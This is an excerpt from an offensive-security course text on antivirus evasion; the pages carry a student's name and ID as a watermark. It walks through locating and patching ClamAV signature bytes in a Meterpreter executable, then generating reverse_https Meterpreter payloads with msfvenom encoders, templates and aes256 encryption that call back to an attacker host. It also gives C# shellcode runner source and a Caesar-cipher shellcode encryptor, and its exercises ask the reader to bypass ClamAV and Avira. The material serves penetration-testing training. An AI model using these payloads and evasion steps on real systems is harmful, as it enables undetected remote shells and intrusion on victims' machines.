C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force 
 
    Directory: C:\Tools 
 
Mode                LastWriteTime         Length Name 
----                -------------         ------ ---- 
d-----       10/17/2019   3:40 AM                avtest1 
VERBOSE: This script will now write 8 binaries to "C:\Tools\avtest1". 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
161 
VERBOSE: Byte 0 -> 0 
VERBOSE: Byte 0 -> 10000 
VERBOSE: Byte 0 -> 20000 
VERBOSE: Byte 0 -> 30000 
VERBOSE: Byte 0 -> 40000 
VERBOSE: Byte 0 -> 50000 
VERBOSE: Byte 0 -> 60000 
VERBOSE: Byte 0 -> 70000 
VERBOSE: Byte 0 -> 73801 
VERBOSE: Files written to disk. Flushing memory. 
VERBOSE: Completed! 
Listing 207 - Using Find-AVSignature to split file into intervals 
Pay close attention to this output. Note that the first binary contains zero bytes. The second 
binary contains 10000 bytes. This means that the second file contains bytes 0-10000 of our 
Meterpreter binary. 
Now that we have split our Meterpreter executable into segments and saved them to 
C:\Tools\avtest1, we can scan them with ClamAV. This must be done from the command line, so 
we’ll open a new administrative PowerShell prompt and navigate to the C:\Program Files\ClamAV 
folder. 
From here, we’ll launch the clamscan.exe executable, running the scan against the segments in 
the C:\Tools\avtest1 folder as shown in Listing 208. 
PS C:\Windows\system32> cd 'C:\Program Files\ClamAV\' 
 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest1 
C:\Tools\avtest1\met_0.bin: OK 
C:\Tools\avtest1\met_10000.bin: OK 
C:\Tools\avtest1\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest1\met_30000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest1\met_40000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest1\met_50000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest1\met_60000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest1\met_70000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest1\met_73801.bin: Win.Trojan.MSShellcode-7 FOUND 
 
----------- SCAN SUMMARY ----------- 
Known viruses: 6494159 
Engine version: 0.101.4 
Scanned directories: 1 
Scanned files: 9 
Infected files: 7 
Data scanned: 0.32 MB 
Data read: 0.32 MB (ratio 1.00:1) 
Time: 107.399 sec (1 m 47 s) 
Listing 208 - Scanning with ClamAV 
The first file passes detection. This is no surprise, since it is empty. The second file, which 
contains the first 10000 bytes of our binary, is clean as well. This means that the first signature 
was detected in the third file, somewhere between offset 10000 and 20000. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
162 
 
Note that offsets and number of detections found may vary for each generation 
of a Meterpreter executable. 
To investigate further, we’ll run Find-AVSignature again to split the Meterpreter executable with 
1000 byte intervals, but only from offset 10000 to 20000. We’ll change the output directory to 
C:\Tools\avtest2 in order to separate the output from our various iterations as shown in Listing 
209. 
PS C:\Tools> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path 
C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force 
Listing 209 - Splitting into 1000 byte intervals 
Next, we’ll scan these segments: 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest2 
C:\Tools\avtest2\met_10000.bin: OK 
C:\Tools\avtest2\met_11000.bin: OK 
C:\Tools\avtest2\met_12000.bin: OK 
C:\Tools\avtest2\met_13000.bin: OK 
C:\Tools\avtest2\met_14000.bin: OK 
C:\Tools\avtest2\met_15000.bin: OK 
C:\Tools\avtest2\met_16000.bin: OK 
C:\Tools\avtest2\met_17000.bin: OK 
C:\Tools\avtest2\met_18000.bin: OK 
C:\Tools\avtest2\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest2\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND 
... 
Listing 210 - Scanning smaller intervals with ClamAV 
These results indicate that the offending bytes are between offsets 18000 and 19000. Let’s 
narrow this further by lowering the interval to 100 bytes and saving to a new directory (Listing 
211). 
PS C:\Tools> Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path 
C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force 
Listing 211 - Reducing the interval to 100 bytes 
We’ll scan these segments: 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest3 
C:\Tools\avtest3\met_18000.bin: OK 
C:\Tools\avtest3\met_18100.bin: OK 
C:\Tools\avtest3\met_18200.bin: OK 
C:\Tools\avtest3\met_18300.bin: OK 
C:\Tools\avtest3\met_18400.bin: OK 
C:\Tools\avtest3\met_18500.bin: OK 
C:\Tools\avtest3\met_18600.bin: OK 
C:\Tools\avtest3\met_18700.bin: OK 
C:\Tools\avtest3\met_18800.bin: OK 
C:\Tools\avtest3\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
163 
C:\Tools\avtest3\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND 
... 
Listing 212 - Scanning the 100 byte interval range 
The output reveals two different signatures. The first is located between 18800 and 18900 and 
the other is located between 18900 and 19000. 
The best approach is to handle each signature individually, so we’ll first divide the 18800 to 18900 
range into 10-byte segments, saving the results to a new directory. 
PS C:\Tools> Find-AVSignature -StartByte 18800 -EndByte 18900 -Interval 10 -Path 
C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force 
Listing 213 - Reducing the interval to 10 bytes 
We’ll then scan these segments as shown in Listing 214. 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest4 
C:\Tools\avtest4\met_18800.bin: OK 
C:\Tools\avtest4\met_18810.bin: OK 
C:\Tools\avtest4\met_18820.bin: OK 
C:\Tools\avtest4\met_18830.bin: OK 
C:\Tools\avtest4\met_18840.bin: OK 
C:\Tools\avtest4\met_18850.bin: OK 
C:\Tools\avtest4\met_18860.bin: OK 
C:\Tools\avtest4\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND 
C:\Tools\avtest4\met_18880.bin: Win.Trojan.Swrort-5710536-0 FOUND 
C:\Tools\avtest4\met_18890.bin: Win.Trojan.Swrort-5710536-0 FOUND 
C:\Tools\avtest4\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND 
... 
Listing 214 - Scanning the 10 byte interval range 
Let’s narrow this down again, by splitting the 18860-18870 range into one-byte intervals. We’ll 
save the results to a new directory and scan it: 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest5 
C:\Tools\avtest5\met_18860.bin: OK 
C:\Tools\avtest5\met_18861.bin: OK 
C:\Tools\avtest5\met_18862.bin: OK 
C:\Tools\avtest5\met_18863.bin: OK 
C:\Tools\avtest5\met_18864.bin: OK 
C:\Tools\avtest5\met_18865.bin: OK 
C:\Tools\avtest5\met_18866.bin: OK 
C:\Tools\avtest5\met_18867.bin: Win.Trojan.Swrort-5710536-0 FOUND 
C:\Tools\avtest5\met_18868.bin: Win.Trojan.Swrort-5710536-0 FOUND 
C:\Tools\avtest5\met_18869.bin: Win.Trojan.Swrort-5710536-0 FOUND 
C:\Tools\avtest5\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND 
... 
Listing 215 - Scanning the 1 byte interval range 
Since the byte at offset 18867 of the Meterpreter executable is part of the ClamAV signature, let’s 
change it in an attempt to evade detection. 
We’ll use PowerShell_ISE to read the bytes of the Meterpreter executable, zero out the byte at 
offset 18867, and write the modified executable to a new file, met_mod.exe: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
164 
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe") 
$bytes[18867] = 0 
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes) 
Listing 216 - Modifying the Meterpreter executable 
To find out if the modification worked, we’ll repeat the split and scan, this time on the modified 
executable. Listing 217 shows a scan of the one-byte split between offset 18860 and 18870. 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest6 
C:\Tools\avtest6\met_mod_18860.bin: OK 
C:\Tools\avtest6\met_mod_18861.bin: OK 
C:\Tools\avtest6\met_mod_18862.bin: OK 
C:\Tools\avtest6\met_mod_18863.bin: OK 
C:\Tools\avtest6\met_mod_18864.bin: OK 
C:\Tools\avtest6\met_mod_18865.bin: OK 
C:\Tools\avtest6\met_mod_18866.bin: OK 
C:\Tools\avtest6\met_mod_18867.bin: OK 
C:\Tools\avtest6\met_mod_18868.bin: OK 
C:\Tools\avtest6\met_mod_18869.bin: OK 
C:\Tools\avtest6\met_mod_18870.bin: OK 
... 
Listing 217 - Scanning the modified executable 
As we can see, this did effectively bypass the signature detection. 
Sometimes, modifying the byte at the exact offset will not evade the signature, 
but modifying the byte before or after it will. 
We succeeded in evading the signature match by modifying a single byte. Recalling that another 
signature was detected in the offset range 18900 to 19000, we’ll repeat the procedure and locate 
the first offending byte. 
After several iterations, we discover that the byte at offset 18987 contains the first signature byte 
as shown in Listing 218. Note that we are now running the split on our modified executable, which 
contains our first signature modification. 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest8 
C:\Tools\avtest8\met_mod_18980.bin: OK 
C:\Tools\avtest8\met_mod_18981.bin: OK 
C:\Tools\avtest8\met_mod_18982.bin: OK 
C:\Tools\avtest8\met_mod_18983.bin: OK 
C:\Tools\avtest8\met_mod_18984.bin: OK 
C:\Tools\avtest8\met_mod_18985.bin: OK 
C:\Tools\avtest8\met_mod_18986.bin: OK 
C:\Tools\avtest8\met_mod_18987.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest8\met_mod_18988.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest8\met_mod_18989.bin: Win.Trojan.MSShellcode-7 FOUND 
C:\Tools\avtest8\met_mod_18990.bin: Win.Trojan.MSShellcode-7 FOUND 
Listing 218 - Locating the second signature 
Once again we have evaded the second signature by modifying this single byte. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
165 
If we continue following this procedure, we find that all bytes evade detection, but the complete 
file is detected. We can evade this by changing the last byte at offset 73801. In this instance, 
changing the byte to 0x00 does not produce a clean scan, but changing it to 0xFF does. 
To fully evade the signature scan, we end up with the following PowerShell script: 
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe") 
$bytes[18867] = 0 
$bytes[18987] = 0 
$bytes[73801] = 0xFF 
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes) 
Listing 219 - Complete modification of the Meterpreter executable 
Again, note that the number of signature detections and offsets may vary. 
Performing a final scan of the complete modified Meterpreter executable, we find that it 
successfully evades detection by ClamAV. 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest14 
C:\Tools\avtest14\met_mod.exe: OK 
Listing 220 - Bypassing signature detection of ClamAV 
With a fully modified Meterpreter executable that bypasses ClamAV, we can launch a Metasploit 
multi/handler and execute the malicious binary but unfortunately, nothing happens. 
We may have successfully bypassed the signature detection, but we have also destroyed some 
functionality inside our executable. Remember that the Meterpreter executable contains the first 
stage shellcode and we have likely changed something in either the shellcode itself or the part of 
the executable that runs it. 
There is only one option to rectify this problem and that is to reverse engineer exactly what those 
three bytes do and attempt to modify them in such a way that the executable still works. 
This can be tedious work, especially considering that the byte offsets may change every time we 
regenerate the Meterpreter executable, and even though we are bypassing ClamAV, we may not 
be bypassing other antivirus products. 
To demonstrate this, let’s open File Explorer and navigate to the folder containing our final 
met_mod.exe. If we right-click it, and choose “Scan selected files with Avira”, we find that Avira 
does, in fact flag it as malicious (Figure 48). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
166 
 
Figure 48: Scanning met_mod.exe with Avira 
This technique works in theory and it sounds relatively straight-forward, but is not very effective in 
the real world, especially considering the fact that we would still have to contend with heuristic 
scanning. 
Instead of continuing with this approach, in the next section we will attempt to encode or encrypt 
the offending code. 
6.3.1.1 Exercise 
1. 
Generate a 32-bit Meterpreter executable and use Find-AVSignature to bypass any ClamAV 
signature detections. Does the modified executable return a shell? 
6.4 Bypassing Antivirus with Metasploit 
In the previous section, we determined that Avira and ClamAV flag the standard 32-bit 
Meterpreter executable. 
Metasploit contains a number of encoders285 that can encode the Meterpreter shellcode, 
subsequently obfuscating the assembly code. In this section, we’ll generate 32-bit and 64-bit 
payloads that we will encode and encrypt with msfvenom in an attempt to bypass signature 
detection. 
6.4.1 Metasploit Encoders 
When Metasploit was released, the msfpayload and msfencode tools could be used to encode 
shellcode in a way that effectively bypassed antivirus detection. However, AV engines have 
improved over the years and the encoders are generally used solely for character substitution to 
replace bad characters in exploit payloads. Nonetheless, in this section, we’ll use msfvenom (a 
merge of the old msfpayload and msfencode tools) to attempt a signature bypass. 
 
285 (Offensive Security, 2020), https://www.offensive-security.com/metasploit-unleashed/msfvenom/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
167 
To begin, let’s list the available encoders by running msfvenom with the --list encoders option 
(Listing 221): 
kali@kali:~$ msfvenom --list encoders 
 
Framework Encoders [--encoder <value>] 
====================================== 
 
    Name                          Rank       Description 
    ----                          ----       ----------- 
 ... 
    x64/xor                       normal     XOR Encoder 
    x64/xor_context               normal     Hostname-based Context Keyed Payload 
Encoder 
    x64/xor_dynamic               normal     Dynamic key XOR Encoder 
    x64/zutto_dekiru              manual     Zutto Dekiru 
    x86/add_sub                   manual     Add/Sub Encoder 
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder 
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder 
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower 
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower 
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR 
Encoder 
    x86/bmp_polyglot              manual     BMP Polyglot 
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder 
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder 
    x86/context_stat              manual     stat(2)-based Context Keyed Payload 
Encoder 
    x86/context_time              manual     time(2)-based Context Keyed Payload 
Encoder 
    x86/countdown                 normal     Single-byte XOR Countdown Encoder 
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR 
Encoder 
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder 
    x86/nonalpha                  low        Non-Alpha Encoder 
    x86/nonupper                  low        Non-Upper Encoder 
    x86/opt_sub                   manual     Sub Encoder (optimised) 
    x86/service                   manual     Register Service 
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder 
    x86/single_static_bit         manual     Single Static Bit 
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase 
Encoder 
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase 
Encoder 
    x86/xor_dynamic               normal     Dynamic key XOR Encoder 
Listing 221 - Listing msfvenom encoders 
The x86/shikata_ga_nai encoder (highlighted above) is a commonly-used polymorphic encoder286 
that produces different output each time it is run, making it effective for signature evasion. 
We’ll enable this encoder with the -e option, supplying the name of the encoder as an argument, 
and we’ll supply the other typical options as shown in Listing 222: 
 
286 (Daniel Sauder, 2015), https://danielsauder.com/2015/08/26/an-analysis-of-shikata-ga-nai/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
168 
kali@kali:~$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 
LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe 
... 
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai 
x86/shikata_ga_nai succeeded with size 635 (iteration=0) 
x86/shikata_ga_nai chosen with final size 635 
Payload size: 635 bytes 
Final size of exe file: 73802 bytes 
Saved as: /var/www/html/met.exe 
Listing 222 - Encoding with x86/shikata_ga_nai 
Since the assembly code has been obfuscated, we’ll copy the generated executable to our 
Windows 10 victim machine and scan it with ClamAV as shown in Listing 223. 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\met.exe 
C:\Tools\met.exe: Win.Trojan.Swrort-5710536-0 FOUND 
... 
Listing 223 - Scanning encoded executable with ClamAV 
Based on the output above, ClamAV detected the encoded shellcode inside the executable. This 
failed because the encoded shellcode must be decoded to be able to run and this requires a 
decoding routine. This decoding routine itself is not encoded, meaning it is static each time, 
making the decoder itself a perfect target for signature detection. 
Let’s try a different approach. Since 64-bit applications have only become popular in recent years, 
it stands to reason that 64-bit malware and payloads are less common. Perhaps this relative 
rarity will provide us an advantage. 
To test this theory, let’s generate a 64-bit Meterpreter without encoding: 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/met64.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x64 from the payload 
No encoder or badchars specified, outputting raw payload 
Payload size: 741 bytes 
Final size of exe file: 7168 bytes 
Saved as: /var/www/html/met64.exe 
Listing 224 - Generating a 64-bit Meterpreter executable 
We’ll copy it to our Windows 10 victim machine and scan it with ClamAV as shown in Listing 225. 
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\met64.exe 
C:\Tools\met64.exe: OK 
... 
Listing 225 - Scanning 64-bit executable with ClamAV 
Interesting. ClamAV does not flag this as malicious. 
Since this is a major victory, let’s push our luck and scan the file with Avira as well. Since we’re 
only interested in signature detection at this point, we’ll execute Avira desktop, navigate to 
Antivirus > Real-Time Protection and verify that real-time protection is turned off. 
Next, we’ll click on the configuration menu at the upper-right corner as shown in Figure 49. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
169 
 
Figure 49: Avira antivirus configuration menu 
In the configuration window, we’ll expand the System Scanner branch, navigate to Scan > 
Heuristics, then de-select the box labelled “Enable AHeAD” (Figure 50). 
 
Figure 50: Disabling heuristics in Avira 
With the heuristics detection disabled, we’ll right-click the met64.exe executable and execute an 
on-demand scan with Avira. As shown in Figure 51, Avira detects the 64-bit shellcode. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
170 
 
Figure 51: Avira detecting 64-bit Meterpreter executable 
Next, let’s use an encoder in an attempt to evade Avira. Since this is a 64-bit executable, we 
cannot use the 32-bit shikata_ga_nai encoder. Instead, we’ll use the x64/zutto_dekiru encoder,287 
which borrows many techniques from shikata_ga_nai. 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o 
/var/www/html/met64_zutto.exe 
... 
Attempting to encode payload with 1 iterations of x64/zutto_dekiru 
x64/zutto_dekiru succeeded with size 840 (iteration=0) 
x64/zutto_dekiru chosen with final size 840 
Payload size: 840 bytes 
Final size of exe file: 7168 bytes 
Saved as: /var/www/html/met64_zutto.exe 
Listing 226 - Encoding with x64/zutto_dekiru 
However, Avira flags this as well, again detecting the signature of the decoder or of the template. 
When msfvenom generates an executable, it inserts the shellcode into a valid executable. This 
template executable is static and likely has signatures attached to it as well. 
We could use the -x option to specify a different template. To do this, we’ll copy the notepad 
application located at C:\Windows\System32\notepad.exe to Kali and use it as a template as 
follows: 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -
o /var/www/html/met64_notepad.exe 
... 
 
287 (Nick Hoffman, Jeremy Humble, Toby Taylor, 2019), https://www.boozallen.com/c/insight/blog/the-zutto-dekiru-encoder-
explained.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
171 
Attempting to encode payload with 1 iterations of x64/zutto_dekiru 
x64/zutto_dekiru succeeded with size 758 (iteration=0) 
x64/zutto_dekiru chosen with final size 758 
Payload size: 758 bytes 
Final size of exe file: 370688 bytes 
Saved as: /var/www/html/met64_notepad.exe 
Listing 227 - Specifying notepad.exe as a template 
We’ll copy the generated executable to our Windows 10 victim machine and again scan it with 
Avira. However, Avira flags it once again (Figure 52). 
 
Figure 52: Avira detecting Meterpreter with notepad template 
So far, we have used Metasploit encoders to successfully bypass ClamAV signature detection, 
but we were not successful against Avira. Clearly, Metasploit encoders are no longer widely 
effective for this purpose. In the next section, we will investigate the effectiveness of specific 
encryption techniques for this task. 
6.4.1.1 Exercise 
1. 
Experiment with different payloads, encoders, and templates to try to bypass signature 
detections in both ClamAV and Avira. 
6.4.2 Metasploit Encryptors 
Rapid7, the developers of Metasploit, launched updated options for encryption in 2018, which 
were designed to address the growing ineffectiveness of encoders for antivirus evasion. We will 
investigate these options next. 
Let’s investigate the effectiveness of this feature. To begin, we’ll run msfvenom with --list 
encrypt to list the encryption options: 
kali@kali:~$ msfvenom --list encrypt 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
172 
Framework Encryption Formats [--encrypt <value>] 
================================================ 
 
    Name 
    ---- 
    aes256 
    base64 
    rc4 
    xor 
Listing 228 - Listing msfvenom encryption types 
Leveraging the strength of aes256288 encryption, we’ll generate an executable with aes256-
encrypted shellcode and use a custom encryption key through the --encrypt-key option (Listing 
229). 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key 
fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x64 from the payload 
No encoder or badchars specified, outputting raw payload 
Payload size: 625 bytes 
Final size of exe file: 7168 bytes 
Saved as: /var/www/html/met64_aes.exe 
Listing 229 - Using AES256 encryption with msfvenom 
Let’s copy the encrypted executable to our Windows 10 victim machine and run an on-demand 
Avira scan: 
 
Figure 53: Avira detecting AES encrypted Meterpreter 
 
288 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Advanced_Encryption_Standard 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
173 
 
Unfortunately, our executable is still flagged. A Rapid7 blog post289 suggests this feature is 
effective for antivirus evasion, but the decryption routine itself can still be detected since it is 
static. 
Our analysis so far has revealed that encryption will not be effective for bypassing security 
solutions if the decoding or decryption techniques are static, since they will be analyzed and 
eventually signatures will be written for them. 
It’s time to change tactics once again. The most effective solution at this point is to write our own 
shellcode runner. In the next section, we’ll begin this process. 
6.4.2.1 Exercises 
1. 
Generate a Metasploit executable using aes256 encryption and verify that it is flagged. 
2. 
Experiment with different payloads, templates, and encryption techniques to attempt to 
bypass Avira. 
6.5 Bypassing Antivirus with C 
As we have discovered, public code and techniques are often flagged by antivirus software. This 
makes sense since antivirus vendors have access to this code as well and have taken the time to 
properly analyze it. 
There are two effective ways to avoid detection. We can either write our own code with custom 
shellcode runners or manually obfuscate any code we use. 
Since we have already implemented a shellcode runner in C#, we will use that as the basis of our 
approach. 
6.5.1 C# Shellcode Runner vs Antivirus 
The C# shellcode runner we developed earlier used VirtualAlloc, CreateThread, and 
WaitForSingleObject but included un-encoded and un-encrypted 64-bit Meterpreter shellcode. 
Let’s try to compile the standalone shellcode runner, which is presented in Listing 230 as a 64-bit 
application. 
using System; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
using System.Net; 
using System.Text; 
using System.Threading; 
 
namespace ConsoleApp1 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
 
289 (Rapid7, 2018), https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
174 
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,  
            uint flAllocationType, uint flProtect); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,  
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,  
                  uint dwCreationFlags, IntPtr lpThreadId); 
 
        [DllImport("kernel32.dll")] 
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,  
            UInt32 dwMilliseconds); 
         
        static void Main(string[] args) 
        { 
            byte[] buf = new byte[752] { 
              0xfc,0x48,0x83,0xe4... 
 
            int size = buf.Length; 
 
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); 
 
            Marshal.Copy(buf, 0, addr, size); 
 
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,  
                IntPtr.Zero, 0, IntPtr.Zero); 
 
            WaitForSingleObject(hThread, 0xFFFFFFFF); 
        } 
    } 
} 
Listing 230 - Shellcode runner in C# 
Let’s compile this code, copy the compiled executable to the Windows 10 victim machine, and 
perform an on-demand scan with Avira: 
 
Figure 54: Custom C# shellcode runner bypassing Avira 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
175 
 
Nice! Our custom shellcode runner bypassed Avira’s signature detection as shown in Figure 54. 
We finally managed to bypass the Avira signature based detection. A ClamAV scan is also clean 
meaning our code is undetected by ClamAV as well. 
While the immediate goal has been accomplished by simply writing our own executable, we 
would like to know how effective this bypass is. Let’s scan our executable with AntiScan.Me. The 
results are displayed in Figure 55: 
 
Figure 55: Custom C# shellcode runner detection with AntiScan.Me 
The report indicates that 11 of the 26 engines flagged our executable. This is not bad for a first 
attempt, especially considering that these engines executed both signature and heuristic scans. 
However, there’s still room to Try Harder. 
Remember that uploading the executable to VirusTotal also sends the data to 
antivirus vendors for analysis. This could potentially expose the code we just 
developed. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
176 
The most commonly-used technique of bypassing antivirus is to obfuscate the embedded 
shellcode so we will address that next. 
6.5.1.1 Exercises 
1. 
Compile the C# shellcode runner and use it to bypass Avira and ClamAV. 
2. 
Enable the heuristics in Avira. Is the code still flagged? 
6.5.2 Encrypting the C# Shellcode Runner 
The key to bypassing antivirus signature detections is custom code, and since we want to encrypt 
the shellcode, we must also create a custom decryption routine to avoid detection. 
When we tried to use encryption with msfvenom, we took advantage of the highly secure and 
complex aes256 encryption algorithm, but implementing an aes256 decryption routine is not 
straightforward so we will opt for the much less secure, but easier-to-use Caesar Cipher.290 
The Caesar cipher was one of the earliest encryption schemes and is very simple. It is 
categorized as a substitution cipher since it substitutes a letter or number by shifting it to the 
right by the number specified in the key. 
As an example, we’ll encrypt the word “Caesar” with a Caesar cipher and a substitution key of 1 
(Listing 231): 
Input   Output 
C   ->  D 
a   ->  b 
e   ->  f 
s   ->  t 
a   ->  b 
r   ->  s 
Listing 231 - Caesar cipher at work 
This is a very simple routine and its reverse is just as simple. We can rotate the same number of 
letters to the left to regain the original text. 
Obviously, this encryption scheme is inherently flawed from a communication security standpoint 
since it is very easy to break. However, it will work well for our purposes, since we can easily 
implement it without using external libraries and it will remove static signatures from the 
shellcode. 
The first step is to create an application that can encrypt our shellcode. We’ll create a new C# 
Console App project in Visual Studio called “Helper”. 
We’ll generate Meterpreter shellcode, embed it in the C# code, and implement the encryption 
routine as displayed in Listing 232. 
namespace Helper 
{ 
    class Program 
 
290 (Practical Cryptography, 2020), http://practicalcryptography.com/ciphers/caesar-cipher/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
177 
    { 
        static void Main(string[] args) 
        { 
            byte[] buf = new byte[752] { 
                0xfc,0x48,0x83,0xe4,0xf0... 
                 
            byte[] encoded = new byte[buf.Length]; 
            for(int i = 0; i < buf.Length; i++) 
            { 
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF); 
            } 
Listing 232 - Encryption routine with Caesar cipher 
In Listing 232, we chose a substitution key of 2, iterated through each byte value in the shellcode, 
and simply added 2 to its value. We performed a bitwise AND operation with 0xFF to keep the 
modified value within the 0-255 range (single byte) in case the increased byte value exceeds 
0xFF. 
For us to be able to use the encrypted shellcode, we must print it to the console, which we can do 
